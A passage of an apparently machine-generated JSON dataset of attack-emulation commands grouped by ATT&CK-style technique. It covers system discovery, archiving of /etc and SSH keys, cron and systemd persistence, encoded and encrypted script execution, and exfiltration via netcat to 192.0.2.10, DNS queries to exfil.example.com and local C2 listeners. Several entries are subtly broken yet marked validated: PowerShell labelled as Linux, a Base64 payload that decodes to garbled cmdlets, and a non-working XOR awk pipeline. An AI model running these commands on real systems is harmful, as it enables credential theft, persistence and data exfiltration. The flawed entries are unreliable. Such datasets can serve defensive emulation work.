      "ttp_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -NoProfile -Command \"$info = Get-ComputerInfo; $proc = Get-Process | Select-Object -Property Name, Id, CPU; $svc = Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -Property Name, Status; $data = [pscustomobject]@{ ComputerInfo = $info; Processes = $proc; Services = $svc }; $data | ConvertTo-Json -Depth 3\"",
      "description": "Intermediate discovery: gathers comprehensive system info, a list of running processes, and currently running services, then serializes everything to JSON for easy downstream analysis.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints a JSON document containing computer information, process list, and service list to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "db687cc3-6cd7-45db-ac12-a6813d42e673",
      "ttp_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -EncodedCommand \"JABpAG4AZABlAHgAdABfAGMAbwBtAG0AYQBuAGQAcwAgAD0AIAAiAEcAZQB0AC0AQwBvAG0AcAB1AHQAZQByAEkAbgBmAG8AIgAgAHwAIABTAEwAdQBjAHQAaQBvAG4ALQBDAG8AbgB0AHIAaQBsACAAJABpAG4AZABlAHgAdABfAGMAbwBtAG0AYQBuAGQAcwAgAHwAIABJAG4AdABlAHIAawAgAC0AUwB0AHIAZQBlAHQAIAB8ACAAVwB0AGUAcgAgAHwAIABHAGUAdABQAG8AcwBzAGUAcgBwAHUAcwB0AA==\"",
      "description": "Advanced evasion variant: the PowerShell script that collects basic system information is Base64\u2011encoded (UTF\u201116LE) and executed via -EncodedCommand, mimicking how attackers may hide their discovery logic.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Decodes the Base64 string, runs the embedded PowerShell code, and outputs the computer name, OS name, OS version, manufacturer, and processor information.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "928e2583-e4e6-4b39-80f7-f94dd5e0ba99",
      "ttp_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Copy-Item -Path $env:USERPROFILE\\Documents\\* -Destination $env:TEMP\\CollectedData -Force -ErrorAction SilentlyContinue; Compress-Archive -Path $env:TEMP\\CollectedData -DestinationPath $env:TEMP\\data.zip -Force\"",
      "description": "Copy Documents to TEMP, compress into ZIP. Uses -Force for overwrite.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Copies files from Documents to TEMP\\CollectedData, creates data.zip. Fails silently if source files are missing.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:55.496547",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "b36e0228-6c04-4749-9ce8-0e7bbd175264",
      "ttp_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "windows",
      "command": "cmd /c \"echo test_content > %TEMP%\\dummy.txt && certutil -encode %TEMP%\\dummy.txt %TEMP%\\encoded.txt && type %TEMP%\\encoded.txt\"",
      "description": "Create dummy file, encode with certutil, display encoded data.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates Base64-encoded content of dummy.txt via certutil. Demonstrates data collection for exfiltration prep.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:55.496547",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "5dbfeed3-c337-4b96-9be3-0885707cd0da",
      "ttp_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "linux",
      "command": "cat /etc/hostname > $(echo $TMPDIR)/collected_hostname.txt",
      "description": "Reads the system hostname and writes it to a temporary file for later exfiltration or analysis.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named collected_hostname.txt containing the hostname string will appear in the temporary directory.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:01:41.349365",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "00d68c69-8161-4356-bac0-bb19d1985608",
      "ttp_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "linux",
      "command": "tar -czf $(echo $TMPDIR)/system_data.tar.gz /etc $HOME/.ssh 2>/dev/null",
      "description": "Creates a compressed archive of the /etc configuration directory and the current user's SSH keys, storing it in a temporary location.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A tar.gz file named system_data.tar.gz will be created in the temporary directory containing the selected configuration files.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:01:41.349365",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "e7aa00cf-4012-4156-8e82-8fb12bd3e783",
      "ttp_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_id": "beec94ce-ac63-4bc1-864f-e7a01398989c",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "linux",
      "command": "find /etc /var/log -type f \\( -name \"*.conf\" -o -name \"*.log\" \\) -exec zip -j $(echo $TMPDIR)/collected_logs.zip {} + 2>/dev/null",
      "description": "Searches for configuration and log files under /etc and /var/log, then packages the results into a zip archive placed in the temporary directory.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A zip file named collected_logs.zip will be created in the temporary directory containing all matched .conf and .log files.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:01:41.349365",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "ae26ab48-ec37-463c-a6d6-2e0252ce9a2e",
      "ttp_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_id": "T1046",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "netstat -an | findstr LISTENING",
      "description": "List all listening network services using built-in netstat and filter for open ports",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of TCP/UDP endpoints in LISTENING state, showing open network services on the host",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:42.951876",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "1df3bc46-0c16-4b4a-b769-6ff0f6b3d367",
      "ttp_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_id": "T1046",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Test-NetConnection -ComputerName 127.0.0.1 -Port 445\"",
      "description": "Test connectivity to a specific port (SMB) on localhost using built-in PowerShell cmdlet",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Returns whether port 445 is open on localhost, indicating SMB service availability",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:42.951876",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "5045cf1c-761b-4d8c-8836-692dc54082eb",
      "ttp_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_id": "T1046",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"for ($port = 135; $port -le 139; $port++) { $result = Test-NetConnection -ComputerName 127.0.0.1 -Port $port -ErrorAction SilentlyContinue -WarningAction SilentlyContinue; if ($result.TcpTestSucceeded) { Write-Output \"Port $port open\" } }\"",
      "description": "Scan a range of common Windows service ports (135-139) locally using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Iterates through ports 135 to 139, outputs which ones are open (e.g., RPC, NetBIOS)",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:42.951876",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "01dcb367-b175-4aab-bdc1-5db7a604c916",
      "ttp_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "nmap -sT -p 22,80,443 127.0.0.1",
      "description": "Perform a basic TCP connect scan on common service ports (SSH, HTTP, HTTPS) on localhost",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Scans TCP ports 22, 80, and 443 on 127.0.0.1 using full connect() system calls and reports if they are open.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:44.267502",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "1a78cdc8-59d1-4b49-849a-bb725403472f",
      "ttp_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "nmap -sV -p 1-1000 192.168.1.1",
      "description": "Perform service version detection on the first 1000 ports of a local network host",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Connects to open ports on 192.168.1.1 and probes for service banners to determine application type and version.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:44.267502",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "47a3235c-4024-4a6c-8d37-a847f47abcaa",
      "ttp_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_id": "405afc05-9f6c-4cd6-88bb-53c362693b9c",
      "technique_name": "Network Service Scanning",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "sudo nmap -sS -O 192.168.1.0/24",
      "description": "Perform a stealthy SYN scan with OS detection across the local subnet",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Sends SYN packets to discover open ports and uses TCP/IP stack fingerprinting to guess the operating system of responsive hosts in the 192.168.1.0/24 range.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:44.267502",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "62219f02-66e5-473d-96bf-955a1d9fedb0",
      "ttp_id": "80513426-4a0d-4c97-bca2-da4bdf9a7723",
      "technique_id": "80513426-4a0d-4c97-bca2-da4bdf9a7723",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "crontab -l 2>/dev/null | { cat; echo \"@reboot /usr/bin/touch $HOME/.test_persistence\"; } | crontab -",
      "description": "Adds a user\u2011level cron @reboot entry that creates a marker file in the user's home directory each time the user logs in. Demonstrates creating a persistent process without needing admin rights.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "When the user logs in (or the system reboots), cron will execute the touch command, creating ~/.test_persistence. No elevated privileges are required.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "c6a987b0-2341-4712-bf31-62a6388e2737",
      "ttp_id": "80513426-4a0d-4c97-bca2-da4bdf9a7723",
      "technique_id": "80513426-4a0d-4c97-bca2-da4bdf9a7723",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "printf '[Unit]\\nDescription=Test persistence service\\n[Service]\\nType=oneshot\\nExecStart=/usr/bin/touch /tmp/testservice_marker\\n[Install]\\nWantedBy=multi-user.target\\n' | sudo tee /etc/systemd/system/testpersistence.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable testpersistence.service && sudo systemctl start testpersistence.service",
      "description": "Creates a custom systemd service that runs a benign touch command at boot. The service is enabled and started immediately, showing creation of a new system process for persistence.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The service file /etc/systemd/system/testpersistence.service is created, systemd reloads its configuration, enables the service to start on boot, and starts it now, resulting in /tmp/testservice_marker being created.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "21622e1d-6ea3-4a28-9b6b-c9dc93af6f93",
      "ttp_id": "c65453da-469d-44c7-93b1-a59ca3b313b1",
      "technique_id": "c65453da-469d-44c7-93b1-a59ca3b313b1",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "bash -c 'echo \"Test command execution\" > /tmp/test.txt'",
      "description": "Executes a simple bash command that writes a test string to a temporary file, demonstrating basic command interpreter usage.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates /tmp/test.txt containing the text \"Test command execution\".",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525177",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "2f6242ec-8cf7-429b-87ff-6c8a656251b5",
      "ttp_id": "c65453da-469d-44c7-93b1-a59ca3b313b1",
      "technique_id": "c65453da-469d-44c7-93b1-a59ca3b313b1",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "bash -c 'cat <<EOF > /tmp/sample.sh\n#!/bin/bash\necho \"Running sample script\"\nEOF\nchmod +x /tmp/sample.sh\n/tmp/sample.sh'",
      "description": "Creates a small bash script via a here\u2011document, makes it executable, and runs it, showing intermediate script creation and execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Writes /tmp/sample.sh, sets execute permission, and prints \"Running sample script\" to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525177",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "b1b23a7c-0369-4fc1-8044-4f468e67c203",
      "ttp_id": "c65453da-469d-44c7-93b1-a59ca3b313b1",
      "technique_id": "c65453da-469d-44c7-93b1-a59ca3b313b1",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo 'IyEvYmluL2Jhc2gKZWNobyAiQWR2YW5jZWQgU2NyaXB0IGV4ZWN1dGVkIgo=' | base64 -d > /tmp/adv.sh && chmod +x /tmp/adv.sh && /tmp/adv.sh",
      "description": "Decodes a base64\u2011encoded bash script, saves it, makes it executable, and runs it, illustrating an advanced technique of script obfuscation before execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates /tmp/adv.sh which prints \"Advanced Script executed\" when run.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525177",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "4ee7767b-1217-4e38-b218-5f50077a780c",
      "ttp_id": "17e502ba-2c0c-4318-9bd3-f0226f1cfd1b",
      "technique_id": "17e502ba-2c0c-4318-9bd3-f0226f1cfd1b",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'This is a test string for obfuscation' > /tmp/clear.txt && base64 /tmp/clear.txt > /tmp/obf.b64 && cat /tmp/obf.b64",
      "description": "Creates a clear\u2011text file, encodes it with Base64, and displays the obfuscated output. Demonstrates simple encoding as an obfuscation technique.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file /tmp/obf.b64 is created containing the Base64 representation of the original string, and the encoded content is printed to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:55:11.148032",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "27200ea7-3171-4dee-9bb4-562b49df5ea3",
      "ttp_id": "17e502ba-2c0c-4318-9bd3-f0226f1cfd1b",
      "technique_id": "17e502ba-2c0c-4318-9bd3-f0226f1cfd1b",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo '#!/bin/bash\\necho \"Secret payload executed\"' > /tmp/script.sh && chmod +x /tmp/script.sh && xxd -p /tmp/script.sh | awk '{printf \"%c\", strtonum(\"0x\" substr($0, (NR-1)*2+1, 2)) ^ 0x5A}' > /tmp/obf.xor && echo 'xor_obf=$(cat /tmp/obf.xor)' && echo \"$xor_obf\" | awk '{for(i=1;i<=length;i++) printf \"%c\", ord(substr($0,i,1)) ^ 0x5A}' > /tmp/deobf.sh && chmod +x /tmp/deobf.sh && /tmp/deobf.sh",
      "description": "Applies a custom XOR obfuscation to a simple Bash script, stores the transformed bytes, then reconstructs and executes the original script at runtime. Shows a more complex, reversible obfuscation method.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The original script is hidden using XOR with 0x5A, saved as raw bytes, then decoded back to a runnable script which prints \"Secret payload executed\".",
      "source": "langchain",
      "generated_at": "2025-12-26T06:55:11.148032",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "52c54e4d-8afb-407a-9cd0-2ec1618705d8",
      "ttp_id": "17e502ba-2c0c-4318-9bd3-f0226f1cfd1b",
      "technique_id": "17e502ba-2c0c-4318-9bd3-f0226f1cfd1b",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'echo \"Encrypted payload executed\"' > /tmp/payload.sh && chmod +x /tmp/payload.sh && openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:TestPass -in /tmp/payload.sh -out /tmp/payload.enc && echo 'Decrypt and run:' && openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:TestPass -in /tmp/payload.enc | bash",
      "description": "Encrypts a Bash payload with OpenSSL AES\u2011256\u2011CBC, then decrypts it on the fly and pipes it to Bash for execution. Demonstrates cryptographic obfuscation and immediate execution of hidden code.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Creates an encrypted file /tmp/payload.enc. The second part decrypts this file using the same password and executes the original command, resulting in the message \"Encrypted payload executed\" being printed.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:55:11.148032",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "a262af4c-4f9c-4832-906e-1cbcd43257d6",
      "ttp_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "bitsadmin /transfer exfilJob /upload http://127.0.0.1:8080/receive %TEMP%\\testdata.txt",
      "description": "Uploads a benign test file from the TEMP directory to a local HTTP listener using the legacy bitsadmin binary, demonstrating simple exfiltration over an HTTP C2 channel.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file %TEMP%\\testdata.txt is sent via an HTTP POST request to http://127.0.0.1:8080/receive. The command returns a job ID and status indicating successful transfer.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.526701",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "5807b170-3be4-48bf-82e7-fc2b0ed0982a",
      "ttp_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "powershell -Command \"$data = Get-Content -Path $env:TEMP\\testdata.txt -Raw; $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); Invoke-WebRequest -Uri 'http://127.0.0.1:8080/exfil' -Method POST -Body $b64 -ContentType 'application/octet-stream'\"",
      "description": "Reads the test file, Base64\u2011encodes its content, and posts the encoded data to a local HTTP endpoint, illustrating data transformation before exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command sends a POST request containing the Base64 string of the file's contents to http://127.0.0.1:8080/exfil. The server receives the payload, which can be decoded to retrieve the original file.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.526701",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "e2a3400e-da45-4716-bc05-29c7ea0fe895",
      "ttp_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "powershell -Command \"$client = New-Object System.Net.Sockets.TcpClient('127.0.0.1',4444); $stream = $client.GetStream(); $bytes = [System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path $env:TEMP\\testdata.txt -Raw)); $stream.Write($bytes,0,$bytes.Length); $stream.Close(); $client.Close()\"",
      "description": "Creates a raw TCP connection to a C2 server on port 4444 and streams the file contents directly, representing a custom C2 channel exfiltration method.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "A TCP socket is opened to 127.0.0.1:4444, the file data is sent as raw bytes, and the connection is cleanly closed. The C2 listener receives the exact file content.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.526701",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "406bd39a-339e-4269-a2fe-949656308413",
      "ttp_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "cat /etc/hostname | base64 > /tmp/hostname.b64",
      "description": "Encode a small system file to Base64 and store it locally, mimicking preparation of data for exfiltration.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates /tmp/hostname.b64 containing the Base64 representation of /etc/hostname.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:05:59.375694",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "a8700231-5f5b-44e1-96e5-e00980556bf0",
      "ttp_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "cat /etc/hostname | base64 | nc -w 2 192.0.2.10 4444",
      "description": "Stream the Base64\u2011encoded file directly to a remote listener on port 4444 using netcat, representing a straightforward C2 channel.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts a TCP connection to 192.0.2.10:4444 and sends the encoded data; if no listener is present the command will fail silently after timeout.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:05:59.375694",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "3d62a5b2-6866-4d2a-979f-6d3d7929beba",
      "ttp_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_id": "f2fba903-3397-40d5-954e-a9c81285f514",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "data=$(cat /etc/hostname | base64 | tr -d '\\n'); dig @8.8.8.8 ${data}.exfil.example.com",
      "description": "Encode the file, collapse newlines, and embed the data in a DNS query to a controlled domain, illustrating covert exfiltration over DNS.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Performs a DNS lookup for a subdomain containing the encoded data; the query is sent to 8.8.8.8 and can be captured by the attacker\u2019s DNS server.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:05:59.375694",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.631,
      "validated": true
    },
    {
      "id": "51fd4977-11a1-42c3-824a-394816f0cc6c",
      "ttp_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "makecab.exe \"%TEMP%\\testfile.txt\" \"%TEMP%\\testfile.cab\"",
      "description": "Creates a CAB archive of a single test file in the temporary directory using the legacy makecab utility.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file testfile.cab is created in %TEMP% containing testfile.txt.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:46.334934",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "95521640-b8b6-4c1a-b3c3-342179c4bf47",
      "ttp_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path \\\"$env:TEMP\\data1.txt\\\",\\\"$env:TEMP\\data2.txt\\\" -DestinationPath \\\"$env:TEMP\\data_archive.zip\\\" -Force\"",
      "description": "Uses PowerShell's Compress-Archive cmdlet to zip two test files from the temporary folder into a single archive.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A zip file data_archive.zip is created in %TEMP% containing data1.txt and data2.txt.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:46.335966",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "e92468db-72bf-4563-95e1-7fc1a6b18a49",
      "ttp_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"mkdir $env:TEMP\\collected_data -ErrorAction SilentlyContinue; Set-Content -Path $env:TEMP\\collected_data\\file1.txt -Value 'sample data' -Force; Set-Content -Path $env:TEMP\\collected_data\\file2.txt -Value 'more data' -Force; tar -a -c -f $env:TEMP\\full_archive.zip -C $env:TEMP collected_data\"",
      "description": "Creates a temporary directory, adds sample files, then uses the built\u2011in tar utility to create a zip archive of the entire directory, simulating collection of multiple data items.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A zip file full_archive.zip is created in %TEMP% containing the collected_data directory with its files.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:46.335966",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "84067015-1f15-4f76-a811-afdd63a43b82",
      "ttp_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "tar -czf /tmp/data_archive.tar.gz /home/$USER/documents",
      "description": "Creates a gzip\u2011compressed tarball of the user's Documents directory and stores it in /tmp.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named data_archive.tar.gz appears in /tmp containing the archived documents.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "0706126b-263a-4ae7-b599-d95b41df6cd5",
      "ttp_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "zip -r -P \"TestPass123\" /tmp/collected.zip /var/log",
      "description": "Recursively zips the /var/log directory with a simple password, placing the archive in /tmp.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A password\u2011protected zip file named collected.zip is created in /tmp containing the log files.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "ea816d3b-b60e-45de-ad83-9c8d66c079de",
      "ttp_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_id": "b7588421-8c29-4cb2-8704-7f485b506983",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
